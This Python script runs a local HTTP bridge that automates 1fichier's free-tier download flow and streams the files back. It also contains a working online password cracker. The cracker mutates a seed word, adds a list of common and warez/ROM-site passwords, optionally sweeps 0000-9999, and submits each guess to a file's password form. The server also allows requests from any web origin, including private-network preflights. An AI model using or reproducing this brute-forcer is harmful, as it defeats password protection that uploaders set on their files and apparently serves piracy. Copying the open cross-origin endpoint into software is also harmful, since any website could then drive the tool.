#!/usr/bin/env python3
"""1fichier direct-download bridge.

Binds 127.0.0.1:8737, stdlib only. Runs the whole free-tier flow from this
machine - password POST, wait timer, form POST, token capture - then streams
the file back to the browser from this machine's IP, because 1fichier CDN
tokens are bound to the IP that opened the flow. Also carries the password
cracker: wordlist + mutations + optional 0000-9999 sweep.
"""

import html as html_mod
import http.cookiejar
import http.server
import json
import re
import secrets
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

HOST, PORT = "127.0.0.1", 8737
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")

WAIT_CAP = 150
MAX_HOPS = 3
TOKEN_TTL = 3 * 3600
JOB_TTL = 3 * 3600

DIRECT_RE = re.compile(r"https://a-\d+\.1fichier\.com/[^\s\"'<>]+")
PASS_RE = re.compile(r"<input[^>]+type=[\"']password[\"']", re.I)
INPUT_RE = re.compile(r"<input\b[^>]*>", re.I)
ATTR_RE = re.compile(r"([\w:-]+)\s*=\s*[\"']([^\"']*)[\"']")
CT_RE = re.compile(r"\bct\s*=\s*(\d+)")
TEXT_WAIT_RE = re.compile(r"(?:please wait|patienter|wait)\D{0,16}(\d+)\s*(?:sec|second)", re.I)
TEXT_MIN_RE = re.compile(r"(?:please wait|patienter|wait)\D{0,16}(\d+)\s*(?:min|minute)", re.I)
COOLDOWN_RE = re.compile(r"(?:you must wait|devez attendre)\D{0,8}(\d+)\s*(min|minute|sec|second)", re.I)
PW_BAD_RE = re.compile(r"mot de passe (?:incorrect|invalide|erron)|(?:wrong|invalid|incorrect)\s+password", re.I)
GONE_RE = re.compile(r"file (?:has been )?(?:deleted|removed)|file not found|fichier (?:introuvable|supprim)", re.I)

COMMON = (
    "password", "123456", "12345678", "123456789", "1234567890", "qwerty", "azerty",
    "111111", "123123", "abc123", "letmein", "admin", "root", "toor", "pass",
    "motdepasse", "1fichier", "fichier", "download", "upload", "free", "warez",
    "file", "files", "archive", "rar", "zip", "iso", "game", "games", "psx",
    "ps2", "psp", "superpsx", "SuperPSX", "SUPERPSX", "psxrips", "rips", "rom",
    "roms", "nes", "snes", "megadrive", "sega", "nintendo", "sony", "playstation",
    "emulator", "emu", "redump", "isozone", "coolrom", "emuparadise", "romulation",
    "vimm", "edgeemu", "planetemu", "1234", "12345", "0000", "1111", "2222",
    "7777", "8888", "9999", "qwerty123", "q1w2e3", "iloveyou", "monkey", "dragon",
    "master", "shadow", "superman", "batman", "football", "baseball", "princess",
    "sunshine", "whatever", "trustno1", "welcome", "hello", "hello123", "test",
    "test123", "temp", "default", "changeme", "secret", "superpsx.com",
    "superpsx.fr", "super-psx", "super_psx", "superpsx2024", "superpsx2025",
    "superpsx2026", "123456a", "a123456", "abcd1234", "password1", "passw0rd",
    "p@ssw0rd", "admin123", "root123",
)

LINKS = {}
JOBS = {}
LOCK = threading.Lock()


def hidden_fields(page):
    fields = {}
    for tag in INPUT_RE.findall(page):
        if "hidden" not in tag.lower():
            continue
        attrs = {k.lower(): v for k, v in ATTR_RE.findall(tag)}
        name = attrs.get("name")
        if name:
            fields[name] = html_mod.unescape(attrs.get("value", ""))
    return fields


def wait_seconds(page):
    for rx in (CT_RE, TEXT_WAIT_RE):
        m = rx.search(page)
        if m:
            return int(m.group(1))
    m = TEXT_MIN_RE.search(page)
    if m:
        return int(m.group(1)) * 60
    return 0


def site_error(page):
    m = COOLDOWN_RE.search(page)
    if m:
        unit = m.group(2).lower()
        secs = int(m.group(1)) * (60 if unit.startswith("min") else 1)
        return f"1fichier cooldown on this IP: about {secs}s before the next file"
    if PW_BAD_RE.search(page):
        return "password rejected for this file"
    if GONE_RE.search(page):
        return "file not found or removed"
    return None


class Session:
    def __init__(self):
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )
        self.base = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }

    def get(self, url):
        return self._read(urllib.request.Request(url, headers=self.base))

    def post(self, url, fields):
        data = urllib.parse.urlencode(fields).encode()
        headers = dict(self.base)
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        headers["Referer"] = url
        headers["Origin"] = "https://1fichier.com"
        return self._read(urllib.request.Request(url, data=data, headers=headers))

    def _read(self, req):
        try:
            with self.opener.open(req, timeout=40) as resp:
                return resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            raise ValueError(f"1fichier replied HTTP {exc.code}")
        except urllib.error.URLError as exc:
            raise ValueError(f"network error: {exc.reason}")


def resolve(url, password, log):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme != "https" or (parts.hostname or "").lower() not in ("1fichier.com", "www.1fichier.com"):
        raise ValueError("expected an https://1fichier.com/?<id> page link")

    now = time.time()
    with LOCK:
        for key in [k for k, v in LINKS.items() if now - v["born"] > TOKEN_TTL]:
            LINKS.pop(key, None)

    session = Session()
    log.append("GET " + url)
    page = session.get(url)

    if PASS_RE.search(page):
        log.append("password prompt - submitting")
        page = session.post(url, {"pass": password})
        if PASS_RE.search(page) or site_error(page) == "password rejected for this file":
            raise ValueError("password rejected for this file")

    wait = min(wait_seconds(page), WAIT_CAP)
    waited = 0
    if wait:
        waited += wait
        log.append(f"free-tier timer: holding {wait}s")
        time.sleep(wait)

    fields = hidden_fields(page)
    fields["submit"] = "Download"
    log.append("POST download form")
    page = session.post(url, fields)

    for _ in range(MAX_HOPS):
        match = DIRECT_RE.search(page)
        if match:
            direct = html_mod.unescape(match.group(0)).rstrip(".,;")
            host = urllib.parse.urlsplit(direct).hostname or ""
            if host.endswith(".1fichier.com"):
                name = None
                fm = re.search(r'name=["\']fn[\'"][^>]*?value=["\']([^"\']+)', page)
                if fm:
                    name = html_mod.unescape(fm.group(1))
                token = secrets.token_urlsafe(18)
                with LOCK:
                    LINKS[token] = {"url": direct, "opener": session.opener, "name": name, "born": time.time()}
                log.append("direct link acquired")
                return token, direct, name, waited

        err = site_error(page)
        if err:
            raise ValueError(err)

        hop = min(wait_seconds(page), WAIT_CAP)
        if hop:
            waited += hop
            log.append(f"interstitial: holding {hop}s")
            time.sleep(hop)
            page = session.post(url, fields)
            continue
        break

    raise ValueError("no direct link in the response - page layout changed or the request was refused")


def build_candidates(seed, extra, digits, max_len=32):
    out, seen = [], set()

    def add(candidate):
        candidate = (candidate or "").strip()
        if not candidate or len(candidate) > max_len or candidate in seen:
            return
        seen.add(candidate)
        out.append(candidate)

    if extra:
        for entry in extra.splitlines():
            add(entry)

    seed = seed or "SuperPSX"
    low = seed.lower()
    leet = low.translate(str.maketrans("aeiost", "431057"))
    variants = {seed, low, seed.upper(), seed.capitalize(), leet, leet.capitalize()}
    for variant in variants:
        add(variant)
        for suffix in ("1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
                       "01", "12", "123", "1234", "!", "!!", "@", "#",
                       "2020", "2021", "2022", "2023", "2024", "2025", "2026"):
            add(variant + suffix)

    for candidate in COMMON:
        add(candidate)

    if digits:
        for number in range(10000):
            add(f"{number:04d}")

    return out


def crack_worker(job_id, url, candidates, delay):
    job = JOBS[job_id]
    session = Session()
    try:
        gate = session.get(url)
        if not PASS_RE.search(gate):
            job["state"] = "done"
            job["password"] = ""
            job["note"] = "file is not password-protected"
            return
        for candidate in candidates:
            if job.get("stop"):
                job["state"] = "stopped"
                return
            page = session.post(url, {"pass": candidate})
            job["tried"] += 1
            job["last"] = candidate
            if not PASS_RE.search(page):
                job["state"] = "done"
                job["password"] = candidate
                return
            time.sleep(delay)
        job["state"] = "done"
    except ValueError as exc:
        job["state"] = "error"
        job["error"] = str(exc)


class Handler(http.server.BaseHTTPRequestHandler):
    server_version = "f1bridge/2"

    def log_message(self, *args):
        pass

    def _cors(self, preflight=False):
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Access-Control-Expose-Headers", "Content-Disposition, Content-Range, Content-Length")
        if preflight:
            self.send_header("Access-Control-Allow-Private-Network", "true")

    def _json(self, code, payload):
        data = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self._cors()
        self.end_headers()
        self.wfile.write(data)

    def do_OPTIONS(self):
        preflight = self.headers.get("Access-Control-Request-Private-Network") == "true"
        self.send_response(204)
        self._cors(preflight)
        self.end_headers()

    def do_GET(self):
        route = urllib.parse.urlsplit(self.path)
        if route.path == "/health":
            self._json(200, {"ok": True})
            return
        if route.path == "/file":
            query = urllib.parse.parse_qs(route.query)
            self.stream_file(query.get("token", [""])[0])
            return
        if route.path == "/api/crack":
            query = urllib.parse.parse_qs(route.query)
            job_id = query.get("id", [""])[0]
            with LOCK:
                job = JOBS.get(job_id)
                snapshot = None
                if job:
                    elapsed = max(time.time() - job["started"], 0.001)
                    snapshot = {
                        "state": job["state"],
                        "tried": job["tried"],
                        "total": job["total"],
                        "last": job["last"],
                        "password": job["password"],
                        "error": job["error"],
                        "note": job["note"],
                        "rate": round(job["tried"] / elapsed, 2),
                    }
            if not snapshot:
                self._json(404, {"ok": False, "error": "unknown job"})
                return
            self._json(200, dict(snapshot, ok=True))
            return
        self._json(404, {"ok": False, "error": "not found"})

    def do_POST(self):
        route = urllib.parse.urlsplit(self.path)
        length = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(min(length, 65536)) if length else b"{}"
        try:
            body = json.loads(raw or b"{}")
        except json.JSONDecodeError:
            self._json(400, {"ok": False, "error": "bad json"})
            return

        if route.path == "/api/resolve":
            log = []
            try:
                token, direct, name, waited = resolve(
                    (body.get("url") or "").strip(), body.get("password") or "", log
                )
                self._json(200, {"ok": True, "token": token, "direct": direct,
                                 "name": name, "waited": waited, "log": log})
            except ValueError as exc:
                log.append(str(exc))
                self._json(200, {"ok": False, "error": str(exc), "log": log})
            return

        if route.path == "/api/crack":
            url = (body.get("url") or "").strip()
            try:
                parts = urllib.parse.urlsplit(url)
            except ValueError:
                parts = None
            if not parts or parts.scheme != "https" or (parts.hostname or "").lower() not in ("1fichier.com", "www.1fichier.com"):
                self._json(200, {"ok": False, "error": "expected an https://1fichier.com/?<id> page link"})
                return
            try:
                delay = float(body.get("delay", 0.35))
            except (TypeError, ValueError):
                delay = 0.35
            delay = min(max(delay, 0.05), 5.0)
            candidates = build_candidates(
                body.get("seed") or "",
                body.get("extra") or "",
                bool(body.get("digits")),
            )
            job_id = secrets.token_urlsafe(12)
            with LOCK:
                now = time.time()
                for key in [k for k, v in JOBS.items() if v["state"] in ("done", "stopped", "error") and now - v["started"] > JOB_TTL]:
                    JOBS.pop(key, None)
                JOBS[job_id] = {
                    "state": "running", "tried": 0, "total": len(candidates),
                    "last": "", "password": None, "error": None, "note": None,
                    "started": now, "stop": False,
                }
            thread = threading.Thread(target=crack_worker, args=(job_id, url, candidates, delay), daemon=True)
            thread.start()
            self._json(200, {"ok": True, "id": job_id, "total": len(candidates)})
            return

        if route.path == "/api/crack/stop":
            with LOCK:
                job = JOBS.get(body.get("id") or "")
                if job:
                    job["stop"] = True
            self._json(200, {"ok": True})
            return

        self._json(404, {"ok": False, "error": "not found"})

    def stream_file(self, token):
        with LOCK:
            entry = LINKS.get(token)
        if not entry:
            self._json(404, {"ok": False, "error": "unknown or expired token - resolve again"})
            return

        headers = {"User-Agent": UA, "Accept": "*/*", "Referer": "https://1fichier.com/"}
        incoming = self.headers.get("Range")
        if incoming:
            headers["Range"] = incoming
        request = urllib.request.Request(entry["url"], headers=headers)

        try:
            upstream = entry["opener"].open(request, timeout=60)
        except urllib.error.HTTPError as exc:
            self._json(502, {"ok": False, "error": f"upstream HTTP {exc.code} - token expired, resolve again"})
            return
        except urllib.error.URLError as exc:
            self._json(502, {"ok": False, "error": f"network error: {exc.reason}"})
            return

        try:
            self.send_response(upstream.status)
            self.send_header("Content-Type", upstream.headers.get("Content-Type", "application/octet-stream"))
            for name in ("Content-Length", "Content-Range", "Accept-Ranges"):
                value = upstream.headers.get(name)
                if value:
                    self.send_header(name, value)
            disposition = upstream.headers.get("Content-Disposition")
            if not disposition:
                fallback = (entry.get("name") or "download.bin").replace('"', "")
                disposition = f'attachment; filename="{fallback}"'
            self.send_header("Content-Disposition", disposition)
            self._cors()
            self.end_headers()
            while True:
                chunk = upstream.read(65536)
                if not chunk:
                    break
                self.wfile.write(chunk)
        except (BrokenPipeError, ConnectionResetError):
            pass
        finally:
            upstream.close()


def main():
    server = http.server.ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"bridge up on http://{HOST}:{PORT} - keep this window open")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
